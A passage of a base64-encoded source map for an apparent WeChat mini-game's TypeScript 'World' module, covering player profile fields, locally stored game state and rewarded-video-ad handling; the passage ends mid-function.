0FBSyxFQUFFO29CQUMxQixJQUFJLENBQUMsVUFBVSxHQUFHLEtBQUssQ0FBQztvQkFDeEIsSUFBSSxDQUFDLFlBQVksQ0FBQyxXQUFXLEVBQUUsS0FBSyxDQUFDLENBQUM7aUJBQ3pDO1lBQ0wsQ0FBQzs7O1dBcEtBO1FBalNELFNBQVM7UUFDTSxrQkFBVSxHQUFHLENBQUMsQ0FBQztRQUM5QixXQUFXO1FBQ0ksa0JBQVUsR0FBRyxDQUFDLENBQUM7UUFDOUIsV0FBVztRQUNJLHFCQUFhLEdBQUcsQ0FBQyxDQUFDO1FBQ2pDLGFBQWE7UUFDRSxlQUFPLEdBQUcsQ0FBQyxDQUFDO1FBQzNCLGFBQWE7UUFDRSxrQkFBVSxHQUFHLENBQUMsQ0FBQztRQUc5QixTQUFTO1FBQ00sY0FBTSxHQUFHLEdBQUcsQ0FBQztRQUU1QixhQUFhO1FBQ0Usd0JBQWdCLEdBQUcsQ0FBQyxDQUFDO1FBR3BDLGVBQWU7UUFDQSwrQkFBdUIsR0FBRyxDQUFDLENBQUM7UUFFM0MsZUFBZTtRQUNBLDBCQUFrQixHQUFHLENBQUMsQ0FBQztRQUV0QyxZQUFZO1FBQ0cscUJBQWEsR0FBRyxDQUFDLENBQUM7UUFFakMsU0FBUztRQUNNLGFBQUssR0FBRyxJQUFJLENBQUM7UUFFNUIsY0FBYztRQUNDLGtCQUFVLEdBQUcsd0JBQXdCLENBQUM7UUFFckQsYUFBYTtRQUNFLG1CQUFXLEdBQUcsQ0FBQyxDQUFDO1FBQy9CLFdBQVc7UUFDSSxrQkFBVSxHQUFHLElBQUksQ0FBQztRQUVqQyxhQUFhO1FBQ0UsZ0JBQVEsR0FBRyxJQUFJLENBQUM7UUFFaEIsbUJBQVcsR0FBRyxDQUFDLENBQUM7UUFDaEIsaUJBQVMsR0FBRyxFQUFFLENBQUM7UUFFOUIsVUFBVTtRQUNLLGFBQUssR0FBRyxDQUFDLENBQUM7UUFDekIsVUFBVTtRQUNLLGFBQUssR0FBRyxDQUFDLENBQUM7UUFFekIsVUFBVTtRQUNLLGVBQU8sR0FBRyxJQUFJLENBQUM7UUFFOUIsZUFBZTtRQUNBLHVCQUFlLEdBQUcsQ0FBQyxDQUFDO1FBRW5DLGFBQWE7UUFDRSxjQUFNLEdBQUcsSUFBSSxDQUFDO1FBRTdCLDBDQUEwQztRQUMzQixrQkFBVSxHQUFHLENBQUMsQ0FBQztRQUU5QixVQUFVO1FBQ0ssZ0JBQVEsR0FBRyxJQUFJLENBQUM7UUFFL0IsWUFBWTtRQUNFLGtCQUFVLEdBQUcsQ0FBQyxDQUFDO1FBb1lqQyxjQUFDO0tBdmNELEFBdWNDLElBQUE7SUF2Y1ksYUFBTyxVQXVjbkIsQ0FBQTtBQUNMLENBQUMsRUF6akJhLEtBQUssR0FBTCxhQUFLLEtBQUwsYUFBSyxRQXlqQmxCIiwiZmlsZSI6IiIsInNvdXJjZVJvb3QiOiIvIiwic291cmNlc0NvbnRlbnQiOlsiaW1wb3J0IHtMb2NhbFN0b3JhZ2V9IGZyb20gXCIuLi8uLi8uLi9mcmFtZXdvcmsvcGVyc2lzdGVuY2UvTG9jYWxTdG9yYWdlXCI7XHJcbmltcG9ydCBOZXR3b3JrIGZyb20gXCIuLi9uZXR3b3JrL05ldHdvcmtcIjtcclxuaW1wb3J0IHtOZXR3b3JrQ29uZmlnfSBmcm9tIFwiLi4vY29uZmlnL05ldHdvcmtDb25maWdcIjtcclxuaW1wb3J0IEFybW9yeSBmcm9tIFwiLi9Bcm1vcnlcIjtcclxuaW1wb3J0IFByb3BJbmZvIGZyb20gXCIuL1Byb3BJbmZvXCI7XHJcbmltcG9ydCBOZXdiaWVzIGZyb20gXCIuL05ld2JpZXNcIjtcclxuXHJcbmltcG9ydCBHYW1lU3VwcGx5IGZyb20gXCIuLi9nYW1lL0dhbWVTdXBwbHlcIjtcclxuaW1wb3J0IFJlY29tbWVuZFByb3BzQ29udHJvbGxlciBmcm9tIFwiLi4vaG9tZS9SZWNvbW1lbmRQcm9wc0NvbnRyb2xsZXJcIlxyXG5pbXBvcnQgUmVjb21tZW5kQ29udHJvbGxlciBmcm9tIFwiLi4vaG9tZS9SZWNvbW1lbmRDb250cm9sbGVyXCJcclxuaW1wb3J0IFByb3BzSXRlbUNvbnRyb2xsZXIgZnJvbSBcIi4uL2hvbWUvUHJvcHNJdGVtQ29udHJvbGxlclwiXHJcbmltcG9ydCBHYW1lT3ZlciBmcm9tIFwiLi4vZ2FtZS9HYW1lT3ZlclwiXHJcbmltcG9ydCBKYWNrcG90Q29udHJvbGxlciBmcm9tIFwiLi4vaG9tZS9KYWNrcG90Q29udHJvbGxlclwiXHJcbmltcG9ydCBHYW1lUmVsaXZlIGZyb20gXCIuLi9nYW1lL0dhbWVSZWxpdmVcIlxyXG5pbXBvcnQgSG9tZUNvbnRyb2xsZXIgZnJvbSBcIi4uL2hvbWUvSG9tZUNvbnRyb2xsZXJcIlxyXG5cclxuLypcclxuICAgIOinhumikeS6i+S7tuiusOW9lVxyXG4gICAgMeOAgemBk+WFt+aOqOiNkCDjgJBjbGlja+OAkVJlY29tbWVuZFByb3BzQ29udHJvbGxlciBVc2VcclxuICAgIDLjgIHpgZPlhbfkvb/nlKgg44CQY2xpY2vjgJFQcm9wc0l0ZW1Db250cm9sbGVyIFVzZVxyXG4gICAgM+OAgeijheWkh+aOqOiNkCDjgJBjbGlja+OAkVJlY29tbWVuZENvbnRyb2xsZXIgVXNlXHJcbiAgICA044CB6KOF5aSH6KGl57uZIOOAkGNsaWNr44CRR2FtZVN1cHBseSBVc2VTdXBwbHlcclxuICAgIDXjgIHlubjov5DlpKflpZYg44CQQ2xpY2vjgJFHYW1lT3ZlciBvbkdhbWVPdmVyVGFrZVxyXG4gICAgNuOAgeWkmuWAjemHkeW4gSDjgJBjbGlja+OAkUphY2twb3RDb250cm9sbGVyIF90YWtlSXQgICAgIDNcclxuICAgIDfjgIHlpI3mtLsg44CQY2xpY2vjgJFHYW1lUmVsaXZlIFJlbGl2ZVxyXG4gICAgOOOAgemrmOeIhuatpuWZqOW8gOWxgCAg44CQY2xpY2vjgJFIb21lQ29udHJvbGxlciBXZWFwb25TdGFydCAgXHJcbiovXHJcblxyXG5leHBvcnQgbW9kdWxlIFdvcmxkIHtcclxuICAgIC8qKiDog73ph4/mnIDpq5jlgLwgKi9cclxuICAgIGV4cG9ydCBjb25zdCBQT1dFUl9NQVggPSA5OTk7XHJcbiAgICAvKiog6YeR5biB5pyA6auY562J57qnICovXHJcbiAgICBleHBvcnQgY29uc3QgR09MRExWX01BWCA9IDk5OTtcclxuICAgIC8qKiDml6XluLjmlLbnm4rmnIDpq5jnrYnnuqcgKi9cclxuICAgIGV4cG9ydCBjb25zdCBEQVlFQVJOX01BWCA9IDk5OTtcclxuXHJcbiAgICAvKiog5YiG5Lqr5LiK6ZmQICovXHJcbiAgICBleHBvcnQgY29uc3QgU0hBUkVfUkVXQVJEX01BWCA9IDEwMDtcclxuXHJcblxyXG5cclxuICAgIC8vIOiwg+eUqOaWueazlVxyXG4gICAgY29uc3QgZ2FtZVN1cHBseSA9IG5ldyBHYW1lU3VwcGx5KCk7XHJcbiAgICBjb25zdCByZWNvbW1lbmRQcm9wc0NvbnRyb2xsZXIgPSBuZXcgUmVjb21tZW5kUHJvcHNDb250cm9sbGVyKCk7XHJcbiAgICBjb25zdCByZWNvbW1lbmRDb250cm9sbGVyID0gbmV3IFJlY29tbWVuZENvbnRyb2xsZXIoKTtcclxuICAgIGNvbnN0IHByb3BzSXRlbUNvbnRyb2xsZXIgPSBuZXcgUHJvcHNJdGVtQ29udHJvbGxlcigpO1xyXG4gICAgY29uc3QgZ2FtZU92ZXIgPSBuZXcgR2FtZU92ZXIoKTtcclxuICAgIGNvbnN0IGphY2twb3RDb250cm9sbGVyID0gbmV3IEphY2twb3RDb250cm9sbGVyKCk7XHJcbiAgICBjb25zdCBnYW1lUmVsaXZlID0gbmV3IEdhbWVSZWxpdmUoKTtcclxuICAgIGNvbnN0IGhvbWVDb250cm9sbGVyID0gbmV3IEhvbWVDb250cm9sbGVyKCk7XHJcblxyXG4gICAgZXhwb3J0IGNsYXNzIE15IHtcclxuICAgICAgICAvKiog5pi156ewICovXHJcbiAgICAgICAgcHVibGljIHN0YXRpYyBuaWNrTmFtZTogc3RyaW5nO1xyXG4gICAgICAgIC8qKiDlpLTlg491cmwgKi9cclxuICAgICAgICBwdWJsaWMgc3RhdGljIGF2YXRhclVybDogc3RyaW5nO1xyXG4gICAgICAgIC8qKiDmgKfliKsgMO+8muacquefpeOAgTHvvJrnlLfjgIEy77ya5aWzICAqL1xyXG4gICAgICAgIHB1YmxpYyBzdGF0aWMgZ2VuZGVyOiBudW1iZXI7XHJcbiAgICAgICAgLyoqIOecgeS7vSAqL1xyXG4gICAgICAgIHB1YmxpYyBzdGF0aWMgcHJvdmluY2U6IHN0cmluZztcclxuICAgICAgICAvKiog5Z+O5biCICovXHJcbiAgICAgICAgcHVibGljIHN0YXRpYyBjaXR5OiBzdHJpbmc7XHJcbiAgICAgICAgLyoqIOWbveWutiAqL1xyXG4gICAgICAgIHB1YmxpYyBzdGF0aWMgY291bnRyeTogc3RyaW5nO1xyXG5cclxuICAgICAgICAvKiogb3BlbklkICovXHJcbiAgICAgICAgcHVibGljIHN0YXRpYyBvcGVuSWQ6IHN0cmluZztcclxuICAgICAgICAvKiog5Yqg5YWl5aSN5rS75biBICovXHJcbiAgICAgICAgcHVibGljIHN0YXRpYyB0b2RheUFkZDogbnVtYmVyO1xyXG5cclxuICAgICAgICAvKiog5LiK5qyh5re75Yqg5pe26Ze0ICovXHJcbiAgICAgICAgcHVibGljIHN0YXRpYyBsYXN0QWRkVGltZTogbnVtYmVyO1xyXG5cclxuICAgICAgICAvKiog5aSN5rS75biB5pWw6YePICovXHJcbiAgICAgICAgcHVibGljIHN0YXRpYyByZWJpcnRoQ29pbnM6IG51bWJlcjtcclxuXHJcbiAgICAgICAgLyoqIOeOqeWutmlkICovXHJcbiAgICAgICAgcHVibGljIHN0YXRpYyBwbGF5ZXJJZDogbnVtYmVyID0gMDtcclxuICAgICAgICAvKiog55qu6IKkaWQgKi9cclxuICAgICAgICBwdWJsaWMgc3RhdGljIHNraW5JZDogbnVtYmVyID0gMTtcclxuICAgICAgICAvKiog6YGT5YW35pWw6YePICovXHJcbiAgICAgICAgLy8gcHVibGljIHN0YXRpYyBkaWFtb25kOm51bWJlciA9IDA7XHJcblxyXG4gICAgICAgIC8vIC8qKiDmnIDpq5jliIYgKi9cclxuICAgICAgICAvLyBwdWJsaWMgc3RhdGljIGJlc3RTY29yZTpudW1iZXIgPSAwO1xyXG4gICAgICAgIC8vXHJcbiAgICAgICAgLy8gLyoqIOW9k+WJjeWFs+WNoSAqL1xyXG4gICAgICAgIC8vIHB1YmxpYyBzdGF0aWMgbGV2ZWwgPSAzMDtcclxuXHJcbiAgICAgICAgLyoqIOacrOWcsOaXtumXtCAqL1xyXG4gICAgICAgIHByaXZhdGUgc3RhdGljIF9sb2NhbFRpbWUgPSAwO1xyXG5cclxuICAgICAgICAvKiog5pyN5Yqh5Zmo5pe26Ze0ICovXHJcbiAgICAgICAgcHJpdmF0ZSBzdGF0aWMgX3NlcnZlclRpbWUgPSAwO1xyXG5cclxuICAgICAgICBzdGF0aWMgZ2V0IHNlcnZlclRpbWUoKTogbnVtYmVyIHtcclxuICAgICAgICAgICAgbGV0IHQgPSBuZXcgRGF0ZSgpLmdldFRpbWUoKTtcclxuICAgICAgICAgICAgcmV0dXJuIHRoaXMuX3NlcnZlclRpbWUgKyB0IC0gdGhpcy5fbG9jYWxUaW1lO1xyXG4gICAgICAgIH1cclxuXHJcbiAgICAgICAgc3RhdGljIHNldCBzZXJ2ZXJUaW1lKHZhbHVlOiBudW1iZXIpIHtcclxuICAgICAgICAgICAgdGhpcy5fbG9jYWxUaW1lID0gbmV3IERhdGUoKS5nZXRUaW1lKCk7XHJcbiAgICAgICAgICAgIHRoaXMuX3NlcnZlclRpbWUgPSB2YWx1ZTtcclxuICAgICAgICB9XHJcblxyXG4gICAgICAgIC8qKiDmrablmajlupMgKi9cclxuICAgICAgICBwcml2YXRlIHN0YXRpYyBfYXJtb3J5OiBBcm1vcnkgPSBudWxsO1xyXG5cclxuICAgICAgICBzdGF0aWMgZ2V0IGFybW9yeSgpOiBBcm1vcnkge1xyXG4gICAgICAgICAgICBpZiAoIXRoaXMuX2FybW9yeSkge1xyXG4gICAgICAgICAgICAgICAgdGhpcy5fYXJtb3J5ID0gbmV3IEFybW9yeShKU09OLnBhcnNlKFdvcmxkLlN0b3JhZ2UuYXJtb3J5KSk7XHJcbiAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgcmV0dXJuIHRoaXMuX2FybW9yeTtcclxuICAgICAgICB9XHJcblxyXG4gICAgICAgIC8qKiDpgZPlhbflupMgKi9cclxuICAgICAgICBwcml2YXRlIHN0YXRpYyBfcHJvcEluZm86IFByb3BJbmZvID0gbnVsbDtcclxuXHJcbiAgICAgICAgc3RhdGljIGdldCBwcm9wSW5mbygpOiBQcm9wSW5mbyB7XHJcbiAgICAgICAgICAgIGlmICghdGhpcy5fcHJvcEluZm8pIHtcclxuICAgICAgICAgICAgICAgIHRoaXMuX3Byb3BJbmZvID0gbmV3IFByb3BJbmZvKEpTT04ucGFyc2UoV29ybGQuU3RvcmFnZS5wcm9wcykpO1xyXG4gICAgICAgICAgICB9XHJcbiAgICAgICAgICAgIHJldHVybiB0aGlzLl9wcm9wSW5mbztcclxuICAgICAgICB9XHJcblxyXG4gICAgICAgIC8qKiDmlrDmiYvlvJXlr7wgKi9cclxuICAgICAgICBwcml2YXRlIHN0YXRpYyBfbmV3YmllczogTmV3YmllcyA9IG51bGw7XHJcbiAgICAgICAgc3RhdGljIGdldCBuZXdiaWVzKCk6IE5ld2JpZXMge1xyXG4gICAgICAgICAgICBpZiAoIXRoaXMuX25ld2JpZXMpIHtcclxuICAgICAgICAgICAgICAgIHRoaXMuX25ld2JpZXMgPSBuZXcgTmV3YmllcyhKU09OLnBhcnNlKFdvcmxkLlN0b3JhZ2UubmV3YmllcykpO1xyXG4gICAgICAgICAgICB9XHJcbiAgICAgICAgICAgIHJldHVybiB0aGlzLl9uZXdiaWVzO1xyXG4gICAgICAgIH1cclxuICAgIH1cclxuXHJcblxyXG4gICAgLyoqIOabtOaWsFN0b3JhZ2XnmoRrZXkgKi9cclxuICAgIGV4cG9ydCBsZXQgdXBkYXRlU3RvcmFnZUtleXMgPSBbXTtcclxuICAgIGV4cG9ydCBsZXQgcHVzaFN0b3JhZ2VLZXlzID0gW107XHJcblxyXG4gICAgLyoqKioqKioqKioqKioqKioqKiog5Lul5LiL5pWw5o2u5Li65a6i5oi356uv6Ieq5bex566h55CG77yM5Yid5aeL5YC85bCx5piv6buY6K6k5YC8ICoqKioqKioqKioqKioqKioqKioqKiovXHJcbiAgICBleHBvcnQgY2xhc3MgU3RvcmFnZSB7XHJcbiAgICAgICAgLyoqIOWFs+WNoSAqL1xyXG4gICAgICAgIHByaXZhdGUgc3RhdGljIF9nYW1lTGV2ZWwgPSAxO1xyXG4gICAgICAgIC8qKiDph5HluIHmlbDph48gKi9cclxuICAgICAgICBwcml2YXRlIHN0YXRpYyBfZ29sZENvdW50ID0gMDtcclxuICAgICAgICAvKiog6ZK755+z5pWw6YePICovXHJcbiAgICAgICAgcHJpdmF0ZSBzdGF0aWMgX2RpYW1vbmRDb3VudCA9IDA7XHJcbiAgICAgICAgLyoqIOmHkeW4geS7t+WAvOetiee6pyAqL1xyXG4gICAgICAgIHByaXZhdGUgc3RhdGljIF9nb2xkTHYgPSAxO1xyXG4gICAgICAgIC8qKiDml6XluLjmlLbnm4rnrYnnuqcgKi9cclxuICAgICAgICBwcml2YXRlIHN0YXRpYyBfZGF5RWFybkx2ID0gMTtcclxuXHJcblxyXG4gICAgICAgIC8qKiDkvZPlipsgKi9cclxuICAgICAgICBwcml2YXRlIHN0YXRpYyBfcG93ZXIgPSAxMjA7XHJcblxyXG4gICAgICAgIC8qKiDkvZPlipvnu5Pnrpfml7bpl7QgKi9cclxuICAgICAgICBwcml2YXRlIHN0YXRpYyBfcG93ZXJNb2RpZnlUaW1lID0gMDtcclxuXHJcblxyXG4gICAgICAgIC8qKiDml6XluLjmlLbnm4rnu5Pnrpfml7bpl7TjgIAqL1xyXG4gICAgICAgIHByaXZhdGUgc3RhdGljIF9kYXlFYXJuVG90YWxNb2RpZnlUaW1lID0gMDtcclxuXHJcbiAgICAgICAgLyoqIOaXpeW4uOaUtuebiuWIsOacn+aXtumXtCAqL1xyXG4gICAgICAgIHByaXZhdGUgc3RhdGljIF9kYXlFYXJuRXhwaXJlVGltZSA9IDA7XHJcblxyXG4gICAgICAgIC8qKiDml6XluLjmgLvmlLbnm4ogKi9cclxuICAgICAgICBwcml2YXRlIHN0YXRpYyBfZGF5RWFyblRvdGFsID0gMDtcclxuXHJcbiAgICAgICAgLyoqIOS7u+WKoSAqL1xyXG4gICAgICAgIHByaXZhdGUgc3RhdGljIF90YXNrID0gXCJ7fVwiO1xyXG5cclxuICAgICAgICAvKirjgIDmuLjmiI/kuK3ovaznm5jmlbDmja4gKi9cclxuICAgICAgICBwcml2YXRlIHN0YXRpYyBfZ2FtZUx1Y2t5ID0gXCJ7XFxcInRpbWVcXFwiOjAsXFxcIm51bVxcXCI6MH1cIjtcclxuXHJcbiAgICAgICAgLyoqIOa4uOaIj+S4reeahOiDvemHjyAqL1xyXG4gICAgICAgIHByaXZhdGUgc3RhdGljIF9nYW1lRW5lcmd5ID0gMDtcclxuICAgICAgICAvKiog6ZyH5Yqo5byA5YWzICovXHJcbiAgICAgICAgcHJpdmF0ZSBzdGF0aWMgX3NoYWtlT3BlbiA9IHRydWU7XHJcblxyXG4gICAgICAgIC8qKiDmlrDmiYvlvJXlr7zlvIDlhbMgKi9cclxuICAgICAgICBwcml2YXRlIHN0YXRpYyBfbmV3YmllcyA9IFwie31cIjtcclxuXHJcbiAgICAgICAgcHJpdmF0ZSBzdGF0aWMgbW9kaWZ5Q291bnQgPSAwO1xyXG4gICAgICAgIHByaXZhdGUgc3RhdGljIG1heE1vZGlmeSA9IDEwO1xyXG5cclxuICAgICAgICAvKiog55Sf5ZG95YqbICovXHJcbiAgICAgICAgcHJpdmF0ZSBzdGF0aWMgX0hwTHYgPSAxO1xyXG4gICAgICAgIC8qKiDmiJjmlpflipsgKi9cclxuICAgICAgICBwcml2YXRlIHN0YXRpYyBfQURMdiA9IDE7XHJcblxyXG4gICAgICAgIC8qKiDmrablmajlupMgKi9cclxuICAgICAgICBwcml2YXRlIHN0YXRpYyBfYXJtb3J5ID0gXCJ7fVwiO1xyXG5cclxuICAgICAgICAvKiogbHVja3nov5vluqbmnaEgKi9cclxuICAgICAgICBwcml2YXRlIHN0YXRpYyBfcGFzc0x1Y2t5Q291bnQgPSAwO1xyXG5cclxuICAgICAgICAvKiog6YGT5YW35pyJ5pWI5pe26Ze0ICovXHJcbiAgICAgICAgcHJpdmF0ZSBzdGF0aWMgX3Byb3BzID0gXCJ7fVwiO1xyXG5cclxuICAgICAgICAvKiog6Kej6ZSB5paw5p6qKOato+aVsOihqOekuuino+mUgeaWsOaequ+8jOi0n+aVsOihqOekuuW3sue7j+ino+mUgei/h+eahOaWsOaequ+8jDDooajnpLrliJ3lp4vnirbmgIEpICovXHJcbiAgICAgICAgcHJpdmF0ZSBzdGF0aWMgX3VubG9ja0d1biA9IDA7XHJcblxyXG4gICAgICAgIC8qIOa/gOWKseinhumikSAqL1xyXG4gICAgICAgIHByaXZhdGUgc3RhdGljIF92aWRlb0FkID0gbnVsbDtcclxuICAgIFxyXG4gICAgICAgIC8qIOinhumikeS6i+S7tuagh+iusCAqL1xyXG4gICAgICAgIHB1YmxpYyBzdGF0aWMgX3ZpZGVvU2lnbiA9IDA7XHJcblxyXG4gICAgICAgIFxyXG4gICAgICAgIHB1YmxpYyBzdGF0aWMgaW5pdCgpIHtcclxuICAgICAgICAgICAgbGV0IHVwZGF0YUtWRGF0YSA9IExvY2FsU3RvcmFnZS5nZXRTdHJpbmcoXCJ1cGRhdGVLVkRhdGFcIik7XHJcbiAgICAgICAgICAgIGlmICh1cGRhdGFLVkRhdGEgIT0gbnVsbCAmJiB1cGRhdGFLVkRhdGEgIT0gXCJcIikge1xyXG4gICAgICAgICAgICAgICAgdXBkYXRlU3RvcmFnZUtleXMgPSBKU09OLnBhcnNlKHVwZGF0YUtWRGF0YSk7XHJcbiAgICAgICAgICAgICAgICB1cGRhdGVTdG9yYWdlS2V5cy5mb3JFYWNoKHZhbHVlID0+IHtcclxuICAgICAgICAgICAgICAgICAgICBpZiAodHlwZW9mIHRoaXNbXCJfXCIgKyB2YWx1ZV0gPT0gXCJudW1iZXJcIikge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICB0aGlzW1wiX1wiICsgdmFsdWVdID0gTG9jYWxTdG9yYWdlLmdldE51bWJlcih2YWx1ZSk7XHJcbiAgICAgICAgICAgICAgICAgICAgfSBlbHNlIGlmICh0eXBlb2YgdGhpc1tcIl9cIiArIHZhbHVlXSA9PSBcInN0cmluZ1wiKSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIHRoaXNbXCJfXCIgKyB2YWx1ZV0gPSBMb2NhbFN0b3JhZ2UuZ2V0U3RyaW5nKHZhbHVlKTtcclxuICAgICAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKHR5cGVvZiB0aGlzW1wiX1wiICsgdmFsdWVdID09IFwiYm9vbGVhblwiKSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIHRoaXNbXCJfXCIgKyB2YWx1ZV0gPSBMb2NhbFN0b3JhZ2UuZ2V0Qm9vbGVhbih2YWx1ZSk7XHJcbiAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgY29uc29sZS5lcnJvcihga2V5PSR7dmFsdWV9IHR5cGU9JHt0eXBlb2YgdGhpc1tcIl9cIiArIHZhbHVlXX1gKTtcclxuICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICB9KTtcclxuICAgICAgICAgICAgfVxyXG5cclxuICAgICAgICAgICAgLy8g5rWL6K+VXHJcbiAgICAgICAgICAgIGdhbWVTdXBwbHkub25UZXN0KClcclxuXHJcbiAgICAgICAgICAgIHRoaXMuaW5pdFZpZGVvQWQoKVxyXG4gICAgICAgIH1cclxuXHJcbiAgICAgICAgLy8g5Yid5aeL5YyW5r+A5Yqx6KeG6aKRXHJcbiAgICAgICAgcHVibGljIHN0YXRpYyBpbml0VmlkZW9BZCgpIHtcclxuICAgICAgICAgICAgY29uc29sZS5sb2coXCJpbml0VmlkZW9BZFwiKVxyXG5cclxuICAgICAgICAgICAgdGhpcy5fdmlkZW9BZCA9IHd4LmNyZWF0ZVJld2FyZGVkVmlkZW9BZCh7XHJcbiAgICAgICAgICAgICAgICBhZFVuaXRJZDogXCJhZHVuaXQtODJmZTE4NTA2NDYxZjAyOVwiXHJcbiAgICAgICAgICAgIH0pXHJcbiAgICAgICAgICAgIHRoaXMuX3ZpZGVvQWQub25FcnJvcihmdW5jdGlvbihyZXMpe1xyXG4gICAgICAgICAgICAgICAgY29uc29sZS5sb2coXCJ2aWRlb0FkIG9uRXJyb3JcIiwgcmVzKVxyXG4gICAgICAgICAgICB9KVxyXG4gICAgXHJcbiAgICAgICAgICAgIHRoaXMuX3ZpZGVvQWQub25DbG9zZShyZXMgPT4ge1xyXG4gICAgICAgICAgICAgICAgaWYgKHJlcyAmJiByZXMuaXNFbmRlZCB8fCByZXMgPT09IHVuZGVmaW5lZCkge1xyXG4gICAgICAgICAgICAgICAgICAgIHRoaXMudmlkZW9BZF9kbygpXHJcbiAgICAgICAgICAgICAgICB9ZWxzZSB7XHJcbiAgICAgICAgICAgICAgICAgICAgLy8g5YWz6ZetXHJcbiAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgIH0pXHJcbiAgICAgICAgfVxyXG5cclxuICAgICAgICAvLyDlsZXnpLrmv4DlirHop4bpopFcclxuICAgICAgICBwdWJsaWMgc3RhdGljIHZpZGVvQWRfc2hvdygpe1xyXG4gICAgICAgICAgICBjb25zb2xlLmxvZyhcInZpZGVvQWRfc2hvd1wiKVxyXG4gICAgICAgICAgICB0aGlzLl92aWRlb0FkLnNob3coKS5jYXRjaCgoKSA9PiB7XHJcbiAgICAgICAgICAgICAgICAvLyDlpLHotKXph43or5VcclxuICAgICAgICAgICAgICAgIHRoaXMuX3ZpZGVvQWQubG9hZCgpXHJcbiAgICAgICAgICAgICAgICAudGhlbigoKSA9PiB0aGlzLl92aWRlb0FkLnNob3coKSlcclxuICAgICAgICAgICAgICAgIC5jYXRjaChlcnIgPT4ge1xyXG4gICAgICAgICAgICAgICAgICAgIHRoaXMudmlkZW9BZF9kbygpXHJcbiAgICAgICAgICAgICAgICAgICAgY29uc29sZS5sb2coJ+a/gOWKseinhumikSDlub/lkYrmmL7npLrlpLHotKUnLGVycilcclxuICAgICAgICAgICAgICAgIH0pXHJcbiAgICAgICAgICAgIH0pXHJcblxyXG4gICAgICAgICAgICB0aGlzLl92aWRlb0FkLmxvYWQoKVxyXG4gICAgICAgIH1cclxuXHJcbiAgICAgICAgLy8g6KeG6aKR5aSE55CG5LqL5Lu2XHJcbiAgICAgICAgcHVibGljIHN0YXRpYyB2aWRlb0FkX2RvKCl7XHJcbiAgICAgICAgICAgIGNvbnNvbGUubG9nKFwidmlkZW9BZF9kbzpcIiwgdGhpcy5fdmlkZW9TaWduKVxyXG4gICAgICAgICAgICBpZiAodGhpcy5fdmlkZW9TaWduPT0xKSB7XHJcbiAgICAgICAgICAgICAgICBjYy5nYW1lLmVtaXQoXCJ2aWRlb18xXCIpO1xyXG5cclxuICAgICAgICAgICAgfWVsc2UgaWYgKHRoaXMuX3ZpZGVvU2lnbj09Mikge1xyXG4gICAgICAgICAgICAgICAgY2MuZ2FtZS5lbWl0KFwidmlkZW9fMlwiKTtcclxuXHJcbiAgICAgICAgICAgIH1lbHNlIGlmICh0aGlzLl92aWRlb1NpZ249PTMpIHtcclxuICAgICAgICAgICAgICAgIGNjLmdhbWUuZW1pdChcInZpZGVvXzNcIik7XHJcblxyXG4gICAgICAgICAgICB9ZWxzZSBpZiAodGhpcy5fdmlkZW9TaWduPT00KSB7XHJcbiAgICAgICAgICAgICAgICBjYy5nYW1lLmVtaXQoXCJ2aWRlb180XCIpO1xyXG5cclxuICAgICAgICAgICAgfWVsc2UgaWYgKHRoaXMuX3ZpZGVvU2lnbj09NSkge1xyXG4gICAgICAgICAgICAgICAgY2MuZ2FtZS5lbWl0KFwidmlkZW9fNVwiKTtcclxuXHJcbiAgICAgICAgICAgIH1lbHNlIGlmICh0aGlzLl92aWRlb1NpZ249PTYpIHtcclxuICAgICAgICAgICAgICAgIGNjLmdhbWUuZW1pdChcInZpZGVvXzZcIik7XHJcblxyXG4gICAgICAgICAgICB9ZWxzZSBpZiAodGhpcy5fdmlkZW9TaWduPT03KSB7XHJcbiAgICAgICAgICAgICAgICBjYy5nYW1lLmVtaXQoXCJ2aWRlb183XCIpO1xyXG5cclxuICAgICAgICAgICAgfWVsc2UgaWYgKHRoaXMuX3ZpZGVvU2lnbj09OCkge1xyXG4gICAgICAgICAgICAgICAgY2MuZ2FtZS5lbWl0KFwidmlkZW9fOFwiKTtcclxuICAgICAgICAgICAgfVxyXG5cclxuICAgICAgICAgICAgdGhpcy5fdmlkZW9TaWduPTBcclxuICAgICAgICB9XHJcblxyXG5cclxuICAgICAgICBwdWJsaWMgc3RhdGljIGFsbEtleXMoKTogQXJyYXk8c3RyaW5nPiB7XHJcbiAgICAgICAgICAgIGxldCBrZXlzID0gW107XHJcbiAgICAgICAgICAgIGZvciAobGV0IGtleSBpbiBTdG9yYWdlKSB7XHJcbiAgICAgICAgICAgICAgICBpZiAoa2V5LnN0YXJ0c1dpdGgoJ18nKSkge1xyXG4gICAgICAgICAgICAgICAgICAgIGxldCBrID0ga2V5LnN1YnN0cmluZygxKTtcclxuICAgICAgICAgICAgICAgICAgICBrZXlzLnB1c2goayk7XHJcbiAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgcmV0dXJuIGtleXM7XHJcbiAgICAgICAgfVxyXG5cclxuXHJcbiAgICAgICAgcHJpdmF0ZSBzdGF0aWMgdXBkYXRlS1ZEYXRhKGtleTogc3RyaW5nLCB2YWx1ZTogYW55KSB7XHJcbiAgICAgICAgICAgIGlmICghdXBkYXRlU3RvcmFnZUtleXMuaW5jbHVkZXMoa2V5KSkge1xyXG4gICAgICAgICAgICAgICAgdXBkYXRlU3RvcmFnZUtleXMucHVzaChrZXkpO1xyXG4gICAgICAgICAgICB9XHJcbiAgICAgICAgICAgIGlmICh0eXBlb2YgdmFsdWUgPT0gXCJudW1iZXJcIikge1xyXG4gICAgICAgICAgICAgICAgTG9jYWxTdG9yYWdlLnNldE51bWJlcihrZXksIHZhbHVlKTtcclxuICAgICAgICAgICAgfSBlbHNlIGlmICh0eXBlb2YgdmFsdWUgPT0gXCJib29sZWFuXCIpIHtcclxuICAgICAgICAgICAgICAgIExvY2FsU3RvcmFnZS5zZXRCb29sZWFuKGtleSwgdmFsdWUpO1xyXG4gICAgICAgICAgICB9IGVsc2UgaWYgKHR5cGVvZiB2YWx1ZSA9PSBcInN0cmluZ1wiKSB7XHJcbiAgICAgICAgICAgICAgICBMb2NhbFN0b3JhZ2Uuc2V0U3RyaW5nKGtleSwgdmFs